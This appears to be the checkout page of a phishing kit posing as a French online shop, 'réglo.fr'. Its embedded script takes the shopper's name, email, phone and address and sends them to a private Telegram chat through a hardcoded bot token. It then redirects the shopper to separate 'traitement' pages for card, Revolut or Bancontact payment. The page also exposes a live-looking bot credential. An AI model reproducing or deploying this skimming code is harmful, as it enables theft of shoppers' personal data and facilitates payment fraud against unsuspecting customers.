<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalisation de votre commande | réglo.fr</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="checkout.css">
</head>
<body>
    <header class="checkout-header">
        <div class="container">
            <div class="logo-container">
                <div class="logo">réglo<span>.</span></div>
            </div>
        </div>
    </header>
    
    <div class="container">
        <div class="checkout-steps">
            <div class="step completed">
                <div class="step-number">1</div>
                <div class="step-text">Panier</div>
            </div>
            <div class="step active">
                <div class="step-number">2</div>
                <div class="step-text">Livraison</div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-text">Paiement</div>
            </div>
        </div>
        
        <div class="checkout-grid">
            <div class="checkout-main">
                <div class="checkout-section">
                    <h2 class="section-title">
                        <i class="fas fa-truck"></i>
                        Informations de livraison
                    </h2>
                    
                    <form id="delivery-form">
                        <div class="form-row">
                            <div class="form-group">
                                <label for="first-name">Prénom</label>
                                <input type="text" id="first-name" name="first-name" required>
                            </div>
                            <div class="form-group">
                                <label for="last-name">Nom</label>
                                <input type="text" id="last-name" name="last-name" required>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="email">Adresse e-mail</label>
                            <input type="email" id="email" name="email" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="phone">Téléphone</label>
                            <input type="tel" id="phone" name="phone" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="address">Adresse</label>
                            <input type="text" id="address" name="address" required>
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label for="city">Ville</label>
                                <input type="text" id="city" name="city" required>
                            </div>
                            <div class="form-group">
                                <label for="postal-code">Code postal</label>
                                <input type="text" id="postal-code" name="postal-code" required>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="country">Pays</label>
                            <select id="country" name="country" required>
                                <option value="">Sélectionnez un pays</option>
                                <option value="France" selected>France</option>
                                <option value="Belgique">Belgique</option>
                                <option value="Suisse">Suisse</option>
                                <option value="Luxembourg">Luxembourg</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label for="notes">Notes de livraison (optionnel)</label>
                            <textarea id="notes" name="notes" rows="3"></textarea>
                        </div>
                    </form>
                </div>
                
                <div class="checkout-section">
                    <h2 class="section-title">
                        <i class="fas fa-credit-card"></i>
                        Mode de paiement
                    </h2>
                    
                    <div class="payment-methods">
                        <label class="payment-method active" id="credit-card-method">
                            <input type="radio" name="payment-method" value="credit-card" checked>
                            <div class="payment-icon">
                                <i class="far fa-credit-card"></i>
                            </div>
                            <div class="payment-details">
                                <div class="payment-title">Carte de crédit</div>
                                <div class="payment-description">Paiement sécurisé par carte Visa, Mastercard ou CB</div>
                            </div>
                            <div class="payment-method-badge">
                                <i class="fas fa-check"></i>
                            </div>
                        </label>
                        
                        <label class="payment-method" id="revolut-method">
                            <input type="radio" name="payment-method" value="revolut">
                            <div class="payment-icon">
                                <i class="fas fa-mobile-alt"></i>
                            </div>
                            <div class="payment-details">
                                <div class="payment-title">Revolut</div>
                                <div class="payment-description">Paiement instantané via votre compte Revolut</div>
                            </div>
                            <img src="Revolut-Logo.wine.png" alt="Revolut" class="payment-logo">
                            <div class="payment-method-badge">
                                <i class="fas fa-check"></i>
                            </div>
                        </label>
                        
                        <label class="payment-method" id="bancontact-method">
                            <input type="radio" name="payment-method" value="bancontact">
                            <div class="payment-icon">
                                <i class="fas fa-university"></i>
                            </div>
                            <div class="payment-details">
                                <div class="payment-title">Bancontact</div>
                                <div class="payment-description">Paiement direct depuis votre compte bancaire belge</div>
                            </div>
                            <img src="image.png" alt="Bancontact" class="payment-logo">
                            <div class="payment-method-badge">
                                <i class="fas fa-check"></i>
                            </div>
                        </label>
                    </div>
                </div>
            </div>
            
            <div class="checkout-sidebar">
                <div class="checkout-section">
                    <h2 class="section-title">
                        <i class="fas fa-shopping-cart"></i>
                        Votre commande
                    </h2>
                    
                    <div id="order-items">
                        <!-- Les articles seront ajoutés dynamiquement ici -->
                    </div>
                    
                    <div class="order-total">
                        <span>Total</span>
                        <span id="order-total-amount">0,00 €</span>
                    </div>
                    
                    <button id="place-order-btn" class="btn btn-success">
                        <i class="fas fa-lock"></i> Passer la commande
                    </button>
                    
                    <div class="secure-checkout">
                        <i class="fas fa-shield-alt"></i>
                        <span>Paiement sécurisé - Cryptage SSL</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
        const TELEGRAM_CHAT_ID = '5372119436';
        
        // Load order data from localStorage
        const orderData = JSON.parse(localStorage.getItem('currentOrder'));
        const orderItemsContainer = document.getElementById('order-items');
        const orderTotalAmount = document.getElementById('order-total-amount');
        const placeOrderBtn = document.getElementById('place-order-btn');
        const deliveryForm = document.getElementById('delivery-form');
        
        // Payment method elements
        const creditCardMethod = document.getElementById('credit-card-method');
        const revolutMethod = document.getElementById('revolut-method');
        const bancontactMethod = document.getElementById('bancontact-method');
        let selectedPaymentMethod = 'credit-card';
        
        // Initialize payment method selection
        function setupPaymentMethods() {
            const paymentMethods = [creditCardMethod, revolutMethod, bancontactMethod];
            
            paymentMethods.forEach(method => {
                method.addEventListener('click', function() {
                    // Remove active class from all methods
                    paymentMethods.forEach(m => m.classList.remove('active'));
                    
                    // Add active class to selected method
                    this.classList.add('active');
                    
                    // Update selected payment method
                    selectedPaymentMethod = this.querySelector('input').value;
                });
            });
        }
        
        // Display order items
        function displayOrderItems() {
            if (!orderData || !orderData.items || orderData.items.length === 0) {
                orderItemsContainer.innerHTML = '<p>Aucun article dans votre commande.</p>';
                return;
            }
            
            let html = '';
            orderData.items.forEach(item => {
                html += `
                    <div class="order-summary-item">
                        <div class="product-info">
                            <img src="${item.image}" alt="${item.name}" class="product-image" onerror="this.src='placeholder.jpg'">
                            <div>
                                <div class="product-name">${item.name}</div>
                                <div class="product-variant">${item.variant}</div>
                                <div>Quantité: ${item.quantity}</div>
                            </div>
                        </div>
                        <div class="product-price">${(item.price * item.quantity).toFixed(2)} €</div>
                    </div>
                `;
            });
            
            orderItemsContainer.innerHTML = html;
            orderTotalAmount.textContent = `${orderData.total.toFixed(2)} €`;
        }
        
        // Improved function to send order to Telegram
        async function sendOrderToTelegram(customer) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error('Telegram bot configuration missing');
                return false;
            }
            
            try {
                // Format the message with better structure
                let message = `🛒 <b>NOUVELLE COMMANDE</b> 🛒\n\n`;
                message += `🆔 <b>Référence:</b> ${orderData.orderId}\n`;
                message += `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR', {
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit'
                })}\n\n`;
                
                message += `👤 <b>Client:</b>\n`;
                message += `- ${customer.firstName} ${customer.lastName}\n`;
                message += `- 📧 ${customer.email}\n`;
                message += `- 📞 ${customer.phone}\n\n`;
                
                message += `🏠 <b>Livraison:</b>\n`;
                message += `- ${customer.address}\n`;
                message += `- ${customer.postalCode} ${customer.city}\n`;
                message += `- ${customer.country}\n`;
                if (customer.notes) {
                    message += `- Notes: ${customer.notes}\n`;
                }
                message += `\n`;
                
                message += `💳 <b>Paiement:</b> ${getPaymentMethodName(selectedPaymentMethod)}\n\n`;
                
                message += `📦 <b>Articles (${orderData.items.reduce((sum, item) => sum + item.quantity, 0)}):</b>\n`;
                orderData.items.forEach(item => {
                    message += `- ${item.name} (${item.variant}) × ${item.quantity}: ${(item.price * item.quantity).toFixed(2)} €\n`;
                });
                
                message += `\n💰 <b>Total:</b> ${orderData.total.toFixed(2)} €`;
                
                // Send using POST request with proper headers
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                
                if (!response.ok) {
                    console.error('Telegram API Error:', data);
                    return false;
                }
                
                console.log('Message envoyé avec succès à Telegram');
                return true;
            } catch (error) {
                console.error('Erreur lors de l\'envoi à Telegram:', error);
                return false;
            }
        }
        
        // Helper function to get payment method name
        function getPaymentMethodName(method) {
            switch(method) {
                case 'credit-card':
                    return 'Carte de crédit';
                case 'revolut':
                    return 'Revolut';
                case 'bancontact':
                    return 'Bancontact';
                default:
                    return method;
            }
        }
        
        // Get redirect URL based on payment method
        function getRedirectUrl() {
            switch(selectedPaymentMethod) {
                case 'credit-card':
                    return 'traitement1.html';
                case 'revolut':
                    return 'traitement10.html';
                case 'bancontact':
                    return 'traitement20.html';
                default:
                    return 'traitement1.html';
            }
        }
        
        // Improved form submission handler
        placeOrderBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            if (!deliveryForm.checkValidity()) {
                deliveryForm.reportValidity();
                return;
            }
            
            // Create customer object
            const customer = {
                firstName: document.getElementById('first-name').value.trim(),
                lastName: document.getElementById('last-name').value.trim(),
                email: document.getElementById('email').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                address: document.getElementById('address').value.trim(),
                city: document.getElementById('city').value.trim(),
                postalCode: document.getElementById('postal-code').value.trim(),
                country: document.getElementById('country').value.trim(),
                notes: document.getElementById('notes').value.trim()
            };
            
            // Validate required fields
            if (!customer.firstName || !customer.lastName || !customer.email || !customer.phone || 
                !customer.address || !customer.city || !customer.postalCode) {
                alert('Veuillez remplir tous les champs obligatoires');
                return;
            }
            
            // Save customer data and payment method to order
            orderData.customer = customer;
            orderData.paymentMethod = selectedPaymentMethod;
            localStorage.setItem('currentOrder', JSON.stringify(orderData));
            
            try {
                // Send to Telegram and wait for completion
                const telegramSuccess = await sendOrderToTelegram(customer);
                
                if (!telegramSuccess) {
                    console.warn("L'envoi à Telegram a échoué, mais la commande sera tout de même traitée");
                }
                
                // Redirect to appropriate payment page
                window.location.href = getRedirectUrl();
            } catch (error) {
                console.error('Erreur lors du traitement de la commande:', error);
                alert('Une erreur est survenue lors du traitement de votre commande. Veuillez réessayer.');
            }
        });
        
        // Initialize the page
        displayOrderItems();
        setupPaymentMethods();
        
        // Set default country to France
        const countrySelect = document.getElementById('country');
        if (countrySelect) {
            countrySelect.value = 'France';
        }
    });
</script>
    <script src="checkout_flow.js" defer></script>
</body>
</html>
